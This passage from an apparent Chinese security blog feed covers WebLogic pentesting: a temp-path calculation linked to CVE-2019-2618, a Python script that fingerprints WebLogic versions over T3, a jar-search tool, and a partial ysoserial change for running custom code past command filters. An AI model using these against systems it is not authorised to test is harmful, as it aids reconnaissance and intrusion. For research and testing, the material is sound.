class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WeblogicPathBuilder</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">generateTempPath</span><span class="params">(String paramString1, String paramString2, String paramString3)</span> </span>&#123;</span><br><span class="line">        StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramString1 != <span class="keyword">null</span>) stringBuffer.append(paramString1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramString2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stringBuffer.append(<span class="string">"_"</span>).append(paramString2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramString3 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stringBuffer.append(<span class="string">"_"</span>).append(paramString3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Long.toString(Math.abs(stringBuffer.toString().hashCode()), <span class="number">36</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String ServerName = args[<span class="number">0</span>];</span><br><span class="line">        String AppName = args[<span class="number">1</span>];</span><br><span class="line">        String AppWarName = AppName + <span class="string">".war"</span>;</span><br><span class="line">        System.out.println(generateTempPath(ServerName,AppName,AppWarName));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算结果和weblogic实际生成完全吻合！！！</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/calc.png" alt="计算结果"></p><p>之后的几天逛Github时，发现早就有人发现其规律。</p><p><a href="https://github.com/dr0op/WeblogicScan/blob/master/app/plugins/CVE-2019-2618.py" target="_blank" rel="noopener">https://github.com/dr0op/WeblogicScan/blob/master/app/plugins/CVE-2019-2618.py</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-背景说明&quot;&gt;&lt;a href=&quot;#0x01-背景说明&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景说明&quot;&gt;&lt;/a&gt;0x01 背景说明&lt;/h2&gt;&lt;p&gt;我们在渗透测试过程中，可以很容易发现weblogic的    &lt;code&gt;serve
      
    
    </summary>
    
      <category term="安全研究" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>通过t3协议识别weblogic版本</title>
    <link href="http://gv7.me/articles/2019/detection-weblogic-version-by-t3/"/>
    <id>http://gv7.me/articles/2019/detection-weblogic-version-by-t3/</id>
    <published>2019-06-10T01:49:51.000Z</published>
    <updated>2019-08-27T01:52:50.892Z</updated>
    
    <content type="html"><![CDATA[<p><strong>识别weblogic版本有什么用呢？</strong></p><p>在检测weblogic漏洞之前，我们往往需要探测下weblogic版本。好判断是否在漏洞版本范围，同时也为我们构造EXP做准备（相同漏洞，可能因为weblogic版本不同需要的对应的EXP，比如CVE-2019-2725）</p><a id="more"></a><h2 id="0x01-以前的方法"><a href="#0x01-以前的方法" class="headerlink" title="0x01 以前的方法"></a>0x01 以前的方法</h2><p>以前的方法是访问控制台登录页面，页面底部便有版本号！这里注意404页面的<code>10.4.5</code>并不是版本号。</p><p>http://<em>.</em>.<em>.</em>:7001/console/login/LoginForm.jsp</p><p><img src="/articles/2019/detection-weblogic-version-by-t3/login.png" alt="控制台登录页面"></p><p>然而这个页面可能会被删除或禁止访问，那有没有其他方法呢？</p><h2 id="0x02-通过t3协议识别"><a href="#0x02-通过t3协议识别" class="headerlink" title="0x02 通过t3协议识别"></a>0x02 通过t3协议识别</h2><p>最近在学习t3协议时，使用wireshark抓包时发现，协议报文中带有weblogic的版本</p><p><img src="/articles/2019/detection-weblogic-version-by-t3/10.3.6.0.png" alt="使用t3协议10.3.6.0版本通信"></p><p><img src="/articles/2019/detection-weblogic-version-by-t3/12.1.3.0.png" alt="使用t3协议12.1.3.0版本通信"></p><p>所以只需要通过t3协议发送以下数据包，即可从返回包中获取Weblogic版本。</p><pre><code>t3 10.3.6AS: 255HL: 19</code></pre><p>这里需要注意，有时候发送数据包时，可能只会返回一个<code>HELLO</code>。这时候说明t3协议应该是开启的，需要多次提交探测包，才可能在某次中成功获取到。</p><p>下面使用脚本来完成我们的上面的想法。</p><pre><code class="python"><span class="comment">#coding=utf-8</span><span class="keyword">import</span> sys<span class="keyword">import</span> socket<span class="keyword">from</span> socket <span class="keyword">import</span> error <span class="keyword">as</span> socket_error<span class="keyword">import</span> urllib<span class="string">'''</span><span class="string">'''</span><span class="function"><span class="keyword">def</span> <span class="title">t3conn</span><span class="params">(host, port)</span>:</span>        <span class="keyword">try</span>:            server_address = (host, port)            <span class="comment">#print 'INFO: Attempting Connection: ' + str(server_address)</span>            sock = socket.create_connection(server_address, <span class="number">4</span>)            sock.settimeout(<span class="number">5</span>)            headers = <span class="string">'t3 10.3.6\nAS:255\nHL:19\n\n'</span>            sock.sendall(headers)            data = <span class="string">""</span>            <span class="keyword">try</span>:                data = sock.recv(<span class="number">1024</span>)            <span class="keyword">except</span> socket.timeout:                <span class="keyword">print</span> <span class="string">'ERROR: Socket Timeout Occurred: '</span> + str(host) + <span class="string">':'</span> + str(port) + <span class="string">'\n'</span>            sock.close()            <span class="keyword">return</span> data        <span class="keyword">except</span> socket_error:            <span class="keyword">print</span> <span class="string">'ERROR: Connection Failed: '</span> + str(host) + <span class="string">':'</span> + str(port) + <span class="string">'\n'</span>            <span class="keyword">return</span> <span class="string">""</span><span class="function"><span class="keyword">def</span> <span class="title">parseURL</span><span class="params">(url)</span>:</span>    protocol, s1 = urllib.splittype(url)    host, s2=  urllib.splithost(s1)    host, port = urllib.splitport(host)    <span class="keyword">if</span> port == <span class="literal">None</span> <span class="keyword">and</span> protocol == <span class="string">'https'</span>:        port = <span class="number">443</span>    <span class="keyword">elif</span> port == <span class="literal">None</span> <span class="keyword">and</span> protocol == <span class="string">'http'</span>:        port = <span class="number">80</span>    <span class="keyword">return</span> protocol,host,port<span class="function"><span class="keyword">def</span> <span class="title">weblogic</span><span class="params">(url)</span>:</span>    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):        protocol,host,port = parseURL(url)        data = t3conn(host, port)        <span class="keyword">if</span> data.strip() == <span class="string">'HELO'</span>:            <span class="keyword">print</span> <span class="string">'INFO: Sever only returned HELO, retrying to get server version.'</span>            <span class="keyword">continue</span>        <span class="keyword">if</span> data == <span class="string">""</span>:            <span class="keyword">break</span>        <span class="keyword">print</span> data        <span class="keyword">if</span> <span class="string">'HELO'</span> <span class="keyword">in</span> data:            found_weblogic_version = data[<span class="number">5</span>:<span class="number">13</span>]            <span class="keyword">print</span> <span class="string">'[+] version: %s'</span> % found_weblogic_version             <span class="comment">#print '[+] result: %s' % data</span>            <span class="keyword">break</span><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span>    <span class="keyword">pass</span><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:    weblogic(sys.argv[<span class="number">1</span>])</code></pre><p><img src="/articles/2019/detection-weblogic-version-by-t3/result.png" alt="脚本探测结果"></p><p>如果未探测到，以下几种可能情况：</p><ol><li>t3协议未启用</li><li>服务器做了负载均衡</li></ol><h2 id="0x03-遗留问题"><a href="#0x03-遗留问题" class="headerlink" title="0x03 遗留问题"></a>0x03 遗留问题</h2><p>有些weblogic站点用的https协议，得有t3s协议去探测，我虽然在代码中考虑到了。但是没未成功，一是没有现成的环境，二是没有实实在在使用过t3s协议。等等weblogic经验更丰富时，在解决！</p><h2 id="0x04-后续"><a href="#0x04-后续" class="headerlink" title="0x04 后续"></a>0x04 后续</h2><p>本来想学n1nty师傅对struts2框架的识别的思路，研究目标应用的底层代码，再构造特定的数据包来识别。无奈目前的知识和经验储备还无法支撑这个思路，等后面深入weblogic底层代码时，有发现再做尝试。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;识别weblogic版本有什么用呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在检测weblogic漏洞之前，我们往往需要探测下weblogic版本。好判断是否在漏洞版本范围，同时也为我们构造EXP做准备（相同漏洞，可能因为weblogic版本不同需要的对应的EXP，比如CVE-2019-2725）&lt;/p&gt;
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>如何快速找到POC/EXP依赖的jar？</title>
    <link href="http://gv7.me/articles/2019/quickly-find-jars-that-depend-on-poc-exp/"/>
    <id>http://gv7.me/articles/2019/quickly-find-jars-that-depend-on-poc-exp/</id>
    <published>2019-05-21T18:43:48.000Z</published>
    <updated>2019-05-21T18:49:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>标题主要是针对安全人员，如果针对是开发人员的话，应该是 <strong>如何快速从众多jar中找到目标类？</strong></p><p>在编写Java相关中间件或者CMS的POC/EXP时一般都会依赖它们的某个jar，但它们的jar往往非常多，并且会分散在各个目录下，那么如何快速找到它们呢？</p><h2 id="0x01-之前的方案"><a href="#0x01-之前的方案" class="headerlink" title="0x01 之前的方案"></a>0x01 之前的方案</h2><p>以前我的方法是把所有的jar复制到一个目录下，然后把它们导入到IDEA中，最后使用IDEA搜索。例如最近在写的一个Weblogic漏洞的POC，编译时提示找不到<code>weblogic.work.ExecuteThread</code>,这时就可以使用该方法搜索到它在<code>wlthin3client.jar</code>中，然后将其引入问题解决。</p><p><img src="/articles/2019/quickly-find-jars-that-depend-on-poc-exp/findbyIDEA.png" alt="通过IDEA搜索"></p><p>不过细想，需要以下步骤：</p><ol><li>新建目录</li><li>复制所有jar到目录下</li><li>打开IDEA</li><li>将所有jar导入IDEA</li><li>在IDEA中搜索目标类 </li></ol><p>这还是稍微有点繁琐了，那能不能更加轻便快速地找到我们需要的类呢？下面通过编程来优雅地给大家省几秒钟。</p><h2 id="0x02-编写代码"><a href="#0x02-编写代码" class="headerlink" title="0x02 编写代码"></a>0x02 编写代码</h2><p>我们要实现的是需提供<code>类名</code>，和<code>jar所在目录</code>就可搜索的小工具，它支持完整类名搜索，也支持通配符。具体如何实现，请参考我代码中的注释和提供的参考文章链接。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> me.gv7.searchclassinjar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipFile;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: c0ny1</span></span><br><span class="line"><span class="comment"> * date: 2019-05-13 23:51:42</span></span><br><span class="line"><span class="comment"> * description: 快速从众多jar中，搜索目标class所在的jar。不区分大小写，支持通配符搜索。</span></span><br><span class="line"><span class="comment"> * reference：</span></span><br><span class="line"><span class="comment"> *  1.https://jdkleo.iteye.com/blog/2392642</span></span><br><span class="line"><span class="comment"> *  2.https://lihong11.iteye.com/blog/1936694</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SearchClassInJar</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String className;</span><br><span class="line">    <span class="keyword">private</span> String jarDir;</span><br><span class="line">    <span class="keyword">private</span> Integer totalNum =  <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SearchClassInJar</span><span class="params">(String className,String jarDir)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.className = className;</span><br><span class="line">        <span class="keyword">this</span>.jarDir = jarDir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将jar中的类文件路径形式改为包路径形式</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> String <span class="title">getClassName</span><span class="params">(ZipEntry entry)</span> </span>&#123;</span><br><span class="line">        StringBuffer className = <span class="keyword">new</span> StringBuffer(entry.getName().replace(<span class="string">'/'</span>,<span class="string">'.'</span>));</span><br><span class="line">        <span class="keyword">return</span> className.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从jar从搜索目标类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">searchClass</span><span class="params">(<span class="keyword">boolean</span> recurse)</span> </span>&#123;</span><br><span class="line">        searchDir(<span class="keyword">this</span>.jarDir, recurse);</span><br><span class="line">        System.out.println(String.format(<span class="string">"[!] Find %s classes"</span>,<span class="keyword">this</span>.totalNum));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//递归搜索目录和子目录下所有jar和zip文件</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">searchDir</span><span class="params">(String dir, <span class="keyword">boolean</span> recurse)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File d = <span class="keyword">new</span> File(dir);</span><br><span class="line">            <span class="keyword">if</span> (!d.isDirectory()) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            File[] files = d.listFiles();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; files.length; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (recurse &amp;&amp; files[i].isDirectory()) &#123;</span><br><span class="line">                    searchDir(files[i].getAbsolutePath(), <span class="keyword">true</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    String filename = files[i].getAbsolutePath();</span><br><span class="line">                    <span class="keyword">if</span> (filename.endsWith(<span class="string">".jar"</span>)||filename.endsWith(<span class="string">".zip"</span>)) &#123;</span><br><span class="line">                        ZipFile zip = <span class="keyword">new</span> ZipFile(filename);</span><br><span class="line">                        Enumeration entries = zip.entries();</span><br><span class="line">                        <span class="keyword">while</span> (entries.hasMoreElements()) &#123;</span><br><span class="line">                            ZipEntry entry = (ZipEntry) entries.nextElement();</span><br><span class="line">                            String thisClassName = getClassName(entry);</span><br><span class="line">                            <span class="keyword">if</span> (wildcardEquals(<span class="keyword">this</span>.className.toLowerCase(),thisClassName.toLowerCase()) || wildcardEquals(<span class="keyword">this</span>.className.toLowerCase() + <span class="string">".class"</span>,thisClassName.toLowerCase())) &#123;</span><br><span class="line">                                String res = String.format(<span class="string">"[+] %s | %s"</span>,thisClassName,filename);</span><br><span class="line">                                System.out.println(res);</span><br><span class="line">                                totalNum++;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通配符匹配</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">wildcardEquals</span><span class="params">(String wildcard, String str)</span> </span>&#123;</span><br><span class="line">        String regRule = WildcardToReg(wildcard);</span><br><span class="line">        <span class="keyword">return</span> Pattern.compile(regRule).matcher(str).matches();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将通配符转换为正则表达式</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">WildcardToReg</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] chars = path.toCharArray();</span><br><span class="line">        <span class="keyword">int</span> len = chars.length;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">boolean</span> preX = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (chars[i] == <span class="string">'*'</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (preX)&#123;</span><br><span class="line">                    sb.append(<span class="string">".*"</span>);</span><br><span class="line">                    preX = <span class="keyword">false</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(i+<span class="number">1</span> == len)&#123;</span><br><span class="line">                    sb.append(<span class="string">"[^/]*"</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    preX = <span class="keyword">true</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (preX)&#123;</span><br><span class="line">                    sb.append(<span class="string">"[^/]*"</span>);</span><br><span class="line">                    preX = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (chars[i] == <span class="string">'?'</span>)&#123;</span><br><span class="line">                    sb.append(<span class="string">'.'</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    sb.append(chars[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args.length &lt; <span class="number">2</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"SearchClassInJar v0.1"</span>);</span><br><span class="line">            System.out.println(<span class="string">"Autor：c0ny1&lt;root@gv7.me&gt;"</span>);</span><br><span class="line">            System.out.println(<span class="string">"Usage：java -jar SearchClassInJar.jar &lt;ClassName&gt; &lt;JarDir&gt;"</span>);</span><br><span class="line">            System.out.println(<span class="string">"Example：java -jar SearchClassInJar.jar weblogic.work.ExecuteThread C:\\weblogic"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        SearchClassInJar scij = <span class="keyword">new</span> SearchClassInJar(args[<span class="number">0</span>],args[<span class="number">1</span>]);</span><br><span class="line">        scij.searchClass(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar SearchClassInJar.jar &lt;ClassName&gt; &lt;JarDir&gt;</span><br></pre></td></tr></table></figure><p>PS：大家可自行编译，若需要我编译好的，请公众号后台回复<code>SearchClassInJar</code>获取下载地址!</p><h2 id="0x03-演示效果"><a href="#0x03-演示效果" class="headerlink" title="0x03 演示效果"></a>0x03 演示效果</h2><p>我们还是来找Weblogic下<code>weblogic.work.ExecuteThread</code>类所在的jar。命令行下运行我们写好的程序，指定要搜索的类名和weblogic安装目录即可。可以有以下三种方式搜索。</p><p><img src="/articles/2019/quickly-find-jars-that-depend-on-poc-exp/findbycode.png" alt="演示效果"></p><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><ul><li><a href="https://jdkleo.iteye.com/blog/2392642" target="_blank" rel="noopener">java实现路径通配符<em>,*</em>,?</a></li><li><a href="https://lihong11.iteye.com/blog/1936694" target="_blank" rel="noopener">查找某个类所在jar包</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;标题主要是针对安全人员，如果针对是开发人员的话，应该是 &lt;strong&gt;如何快速从众多jar中找到目标类？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在编写Java相关中间件或者CMS的POC/EXP时一般都会依赖它们的某个jar，但它们的jar往往非常多，并且会分散在各个目录下，那
      
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>使ysoserial支持执行自定义代码</title>
    <link href="http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/"/>
    <id>http://gv7.me/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/</id>
    <published>2019-05-09T21:00:41.000Z</published>
    <updated>2019-05-12T14:22:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>修改ysoserial代码，可使其支持执行自定义代码，是在一次与Bearcat师傅聊天时提到的。当时觉得眼前一亮，感觉在命令执行受阻时，也许可以通过代码执行达到目的。后面去查资料找到了fnmsd师傅的文章，解决了实现该想法的疑问。在此感谢两位师傅给我的启发。</p><a id="more"></a><h2 id="0x01-意义"><a href="#0x01-意义" class="headerlink" title="0x01 意义"></a>0x01 意义</h2><p><strong>一、绕过检测，执行某些禁止命令。</strong></p><p>有些系统做了防护，不许执行或者没有某些命令（比如wget）。这时可以编写命令同等功能的代码，来绕过限制。</p><p><strong>二、解决各个平台命令不一致。</strong></p><p>不同操作系统，命令会有不同。比如查看ip操作，Windows是ipconfig，Linux是ifconfg。而java代码是可以跨平台的。</p><p><strong>三、获取更高的自由度，实现更复杂的操作。</strong></p><p>命令的背后也是代码，当需要执行一些比较复杂的操作时，纯命令是很难实现的，但代码可以！</p><h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><p>在<code>ysoserial/payloads/util/Gadgets.java</code>中的代码注释，作者提到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections（待做，可以做一些有趣的事情比如注入一个纯java的反弹或绑定shell去绕过较弱的保护）</span><br></pre></td></tr></table></figure><p>可知作者也有此意，并给我们预留了可指定自定义代码的变量<code>cmd</code>。</p><p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/cmd-code.png" alt="作者的注释"></p><p>我们从控制台传入的命令，会被保存到<code>command</code>变量中，最后ysoserial会将该变量的值,拼接到<code>&quot;Runtime.getRuntime.exec(&quot; + 命令 + &quot;)&quot;</code>中，生成形成达到命令执行的代码，所以本质上还是代码执行。</p><p><strong>因此要想使ysoserial支持执行自定义代码，只要使得在控制台输入能控制cmd变量的值即可。实现起来并不难</strong></p><h2 id="0x03-编码"><a href="#0x03-编码" class="headerlink" title="0x03 编码"></a>0x03 编码</h2><p>根据我个人的的需要，给ysoserial加入以下三种方式来指定要执行的自定义代码。</p><table><thead><tr><th align="center">序号</th><th align="left">方式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">“code:代码内容”</td><td align="left">代码量比较少时采用</td></tr><tr><td align="center">2</td><td align="left">“codebase64:代码内容base64编码”</td><td align="left">防止代码中存在但引号，双引号，&amp;等字符与控制台命令冲突。</td></tr><tr><td align="center">3</td><td align="left">“codefile:代码文件路径”</td><td align="left">代码量比较多时采用</td></tr></tbody></table><p><strong>注意：如果没有指定以上开头，就默认当命令处理。</strong></p><p>基于上面的需求，我修改了<code>createTemplatesImpl()</code>函数的代码为如下，具体如何实现，请参考代码和注释。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use template gadget class</span></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">    <span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    <span class="comment">// run command in static initializer</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span 